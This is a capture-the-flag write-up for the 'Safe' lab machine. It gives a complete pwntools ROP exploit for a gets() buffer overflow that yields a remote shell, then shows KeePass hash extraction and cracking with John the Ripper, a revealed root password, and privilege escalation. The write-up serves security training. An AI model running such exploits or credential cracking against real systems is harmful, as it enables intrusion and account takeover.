# Safe
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Unauthenticated) | Nmap, Code Analysis, Binary Reversing | An Nmap scan revealed ports 22 (SSH) and 80 (HTTP) were open. The web server on port 80 served a default Apache page with a comment that led to a downloadable `myapp` binary and a service running on port 1337. The `myapp` binary was analyzed using Ghidra and found to be vulnerable to a stack-based buffer overflow via the `gets()` function. |
| 2 | `user` | Stack Buffer Overflow, ROP Chain | A ROP (Return-Oriented Programming) chain was crafted to bypass the NX bit protection. The ROP chain exploited a vulnerable `test()` function to execute the `system()` function with `/bin/sh` as an argument, which was injected into the payload. This granted a shell on the service running on port 1337, resulting in user-level access as `user`. |
| 3 | `root` | File Enumeration, KeePass Brute-Force, SSH Login | Once on the machine, `user.txt` was located in the user's home directory. Further enumeration of the home directory revealed a KeePass database (`MyPasswords.kdbx`) and several `.JPG` files. The KeePass database was downloaded along with the `.JPG` files. The `keepass2john` tool was used to extract hashes from the database, using the `.JPG` files as potential key files. The resulting hash was cracked with John the Ripper and a password list, revealing the password `bullshit` for the `IMG_0547.JPG` key file. The KeePass database was opened with this key and password, revealing the root password. |
| 4 | `root` | Final Flag | The root password was used with the `su -` command to escalate privileges to `root` and retrieve the final flag. |



## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Here we can see that this machine is running debian 10.  
Since port 80 seems to be the only suitable target let's dig into it.  
As we hit the site we can only see the apache default page, no other relevant directories/files are included in the web root.  
If we inspect the default page source code, we can see the following comment:
```
<!-- 'myapp' can be downloaded to analyze from here its running on port 1337 -->
```
So we can download ```myapp``` from ```http://10.10.10.147/myapp``` also, as discovered by full nmap scan we can see that we have a listening service on port 1337:
```
1337/tcp open  waste?
```
if we hit the target on port 1337, we can get the following response:
```
03:04:04 up 1 day, 4 min,  0 users,  load average: 0.00, 0.00, 0.00

What do you want me to echo back? GET / HTTP/1.1
```
Now, let's look into myapp binary and see if we can exploit it.
## User
First thing first, let's open myapp in ghidra and analise it.  
The binary reversing shows the following code:  
```
undefined8 main(void)
{
  char local_78 [112];

  system("/usr/bin/uptime");
  printf("\nWhat do you want me to echo back? ");
  gets(local_78);
  puts(local_78);
  return 0;
}
```
Gets function are notoriously vulnerable and allows attackers to overwrite the stack.  
So, let's open gdb (GEF) and start debugging this app.  
First of all let's try to generate a buffer overflow:
```
gef➤  pattern create 200                    
[+] Generating a pattern of 200 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'
```
Now we can use this string as input of puts() and see if we can generate a buffer overflow, and if so, we can use ```pattern offset``` to check at what offset we can overwrite the stack.  
```
gef➤  pattern offset paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava
[+] Searching for 'paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava'
[+] Found at offset 120 (big-endian search)
```
Now that we've found the offset let’s start crafting a first proof of concept and see if we can control ```RIP```.  
We can write the following PoC and set a breakpoint to main in order to see if we can hit the same breakpoint twice, if so, this means that we managed to hijack the execution:
```
from pwn import *

context(terminal=['tmux','new-window']) # Default terminal used by pwnlib.util.misc.run_in_new_terminal().
                         # Can be a string or an iterable of strings.
                         # In the latter case the first entry is the terminal and the rest are default arguments.
p = gdb.debug('./myapp', 'b main')
context(os='linux', arch='amd64')

junk = ("A"*120).encode() # Converting string to bytes
call_main=p64(0x0040115f)

p.recvuntil('What do you want me to echo back?')
p.sendline(junk + call_main )
```
Now, if we follow the execution step by step, we can see that when the execution is almost come to the end of main, when we hit RET, we see a call for <main+0> again, so this means that we manage to overwrite the stack pointer. By design, when a function returns, the execution of the program proceed with the first address at the top of the stack (if any), in this case main.
```
0x4011a1 <main+66>        call   0x401030 <puts@plt>
 0x4011a6 <main+71>        mov    eax, 0x0
 0x4011ab <main+76>        leave  
→   0x4011ac <main+77>        ret    
↳    0x40115f <main+0>         push   rbp
    0x401160 <main+1>         mov    rbp, rsp
    0x401163 <main+4>         sub    rsp, 0x70
    0x401167 <main+8>         lea    rdi, [rip+0xe9a]        # 0x402008
    0x40116e <main+15>        call   0x401040 <system@plt>
    0x401173 <main+20>        lea    rdi, [rip+0xe9e]        # 0x402018
```
Now that we've seen that we can hijack the execution let's see what we can do:
```
gef➤  checksec
[+] checksec for '/root/Documents/HTB/Boxes/Safe/myapp'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```
As we can see the the binary has the NX bit set: this means that the stack is not executable.  
In order to overcome this, we need to use a exploitation-technique known as “ROP - Return Oriented Programming”.  
Since NX bit is set, we can’t jump into the stack to execute our code. But with ROP, we can still jump around in the existing code.  
The only thing we need to do is to find some special instructions within the application, chain them together and hijack the execution flow of the application.  
If we inspect the main function, we can see that in main there is a system call, and the arguments are passed to system via the RDI registes, so, if we can overwrite RDI with "/bin/sh" we will spawn a shell execution:
```
00401167 48 8d 3d        LEA        RDI,[s_/usr/bin/uptime_00402008]                 = "/usr/bin/uptime"
         9a 0e 00 00
0040116e e8 cd fe        CALL       <EXTERNAL>::system                               int system(char * __command)
         ff ff
```
If we inspect available functions in ghidra, we can see a ```test()``` function that is doing the following:  
```
**************************************************************
*                                                            *
*  FUNCTION                                                  *
**************************************************************
undefined __stdcall test(void)
undefined         AL:1           <RETURN>
test                                            XREF[3]:     Entry Point(*), 00402060,
                                                             00402108(*)  
00401152 55              PUSH       RBP
00401153 48 89 e5        MOV        RBP,RSP
00401156 48 89 e7        MOV        RDI,RSP
00401159 41 ff e5        JMP        R13
```
and it is actually moving the value of the base pointer RBP into the stack pointer RSP (as default when loading a function) and then RSP into RDI and it is jumping to R13.  
Now if we overwrite R13 with the address of system() we will be able to execute /bin/sh (since we already loaded it into BP->SP->RDI).  
To do this let's search for in-memory gadgets:  
```
gef➤  ropper --search "pop r13"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r13

[INFO] File: /root/Documents/HTB/Boxes/Safe/myapp
0x0000000000401206: pop r13; pop r14; pop r15; ret;
```
As we can see, at the address ```0x0000000000401206``` we have a pop r13 followed by two other pops which we can fill with null bytes (0x0).  
now, we should have everything we need to craft the exploit:  
```
from pwn import *

context(terminal=['tmux','new-window']) # Default terminal used by pwnlib.util.misc.run_in_new_terminal().
                         # Can be a string or an iterable of strings.
                         # In the latter case the first entry is the terminal and the rest are default arguments.
p = gdb.debug('./myapp', 'b main')
context(os='linux', arch='amd64')

junk = ("A"*112).encode() # Converting string to bytes
pop_r13 = p64(0x401206)# ropper --search "pop r13" -> 0x0000000000401206: pop r13; pop r14; pop r15; ret;
                       # POP removes the element from the top of the hardware-supported stack into the specified operand
                       # RSP -> R13
                       # if we write system address to R13 then test() will return to R13
null = p64(0x0)
system = p64(0x40116e)
bin_sh = "/bin/sh\x00".encode()
test = p64(0x401152)

#p.recvuntil('What do you want me to echo back?')
p.sendline(junk + bin_sh + pop_r13 + system + null + null + test)
p.interactive()
```
We set junk to 112 and not 120 because the execution points to what you inject in memory after 120:  
* 0-112 is the 'legal' buffer
* 112-120 overwrites the RBP
* 120 and on overwrites RSP
As stated previously when main() function comes to RET, it pops and executes functions queued on the stack, so, what's after 120.
Now we can edit our exploit to attach it to a remote source and get a shell:
```
from pwn import *

context(terminal=['tmux','new-window']) # Default terminal used by pwnlib.util.misc.run_in_new_terminal().
                         # Can be a string or an iterable of strings.
                         # In the latter case the first entry is the terminal and the rest are default arguments.
#p = gdb.debug('./myapp', 'b main')
p = remote('10.10.10.147', 1337)
context(os='linux', arch='amd64')

junk = ("A"*112).encode() # Converting string to bytes
pop_r13 = p64(0x401206)# ropper --search "pop r13" -> 0x0000000000401206: pop r13; pop r14; pop r15; ret;
                       # POP removes the element from the top of the hardware-supported stack into the specified operand
                       # RSP -> R13
                       # if we write system address to R13 then test() will return to R13
null = p64(0x0)
system = p64(0x40116e)
bin_sh = "/bin/sh\x00".encode()
test = p64(0x401152)

#p.recvuntil('What do you want me to echo back?')
p.sendline(junk + bin_sh + pop_r13 + system + null + null + test)
p.interactive()
```
and we get a shell as 'user':   
```
[root@kali Safe ]$ python3 exploit.py
[+] Opening connection to 10.10.10.147 on port 1337: Done
[*] Switching to interactive mode
 04:46:20 up 1 day,  1:46,  0 users,  load average: 0.00, 0.00, 0.00
$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
```

## Root
Once we log in, if we go to the user home directory to grab the user flag, we can see some images and a keepassx file ```MyPasswords.kdbx```:
```
user@safe:~$ ls -l
total 11260
-rw-r--r-- 1 user user 1907614 May 13  2019 IMG_0545.JPG
-rw-r--r-- 1 user user 1916770 May 13  2019 IMG_0546.JPG
-rw-r--r-- 1 user user 2529361 May 13  2019 IMG_0547.JPG
-rw-r--r-- 1 user user 2926644 May 13  2019 IMG_0548.JPG
-rw-r--r-- 1 user user 1125421 May 13  2019 IMG_0552.JPG
-rw-r--r-- 1 user user 1085878 May 13  2019 IMG_0553.JPG
-rw-r--r-- 1 user user    2446 May 13  2019 MyPasswords.kdbx
-rwxr-xr-x 1 user user   16592 May 13  2019 myapp
-rw------- 1 user user      33 May 13  2019 user.txt
```
So let's download the whole folder and try to krack the keepass database.  
To get the hash of the keepass file, we'll need to use one '2john' tool. Let's see if there's one:  
```
[root@kali Safe ]$ locate 2john | grep keep
/usr/sbin/keepass2john
```
to see how this works let's run it without any argument:
```
[root@kali Safe ]$ keepass2john       
Usage: keepass2john [-k <keyfile>] <.kdbx database(s)>
```
As we can see this takes as option a key file. Now to extract all the possible hashes, let's run keepass2john with/without key files, using images as keys:  
```
[root@kali Safe ]$ keepass2john MyPasswords.kdbx >> hashes.txt
```
Now let's do the same with a for loop using images files as keys
```
for i in $(ls *.JPG); do keepass2john -k $i MyPasswords.kdbx | sed "s/MyPasswords/$i/g" >> hashes.txt; done
```
Sed it's used to replace the 'MyPasswords' label with the key file, this will help us in identify the key file required to unlock the keepass database, once we have the full list like below:
```
[root@kali user-home ]$ cat hashes.txt
MyPasswords:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96
IMG_0545.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*17c3509ccfb3f9bf864fca0bfaa9ab137c7fca4729ceed90907899eb50dd88ae
IMG_0546.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*a22ce4289b755aaebc6d4f1b49f2430abb6163e942ecdd10a4575aefe984d162
IMG_0547.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7
IMG_0548.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*d86a22408dcbba156ca37e6883030b1a2699f0da5879c82e422c12e78356390f
IMG_0552.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*facad4962e8f4cb2718c1ff290b5026b7a038ec6de739ee8a8a2dd929c376794
IMG_0553.JPG:$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*7c83badcfe0cd581613699bb4254d3ad06a1a517e2e81c7a7ff4493a5f881cf2
```
Now, let's give this file to john and start cracking (hashcat is giving issue):
```
[root@kali user-home ]$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 0.00% (ETA: 2022-03-09 20:13) 0g/s 23.88p/s 163.1c/s 163.1C/s superman..angels
bullshit         (IMG_0547.JPG)
```
now let's use this password and keyfile to open the keepass database.  
As we open the keepass database we can see the following password for user root:
```
root:u3v2249dl9ptv465cogl3cnpo3fyhk
```
Now we can escalate to root with:
```
user@safe:~$ su -
Password:
root@safe:~# 
```
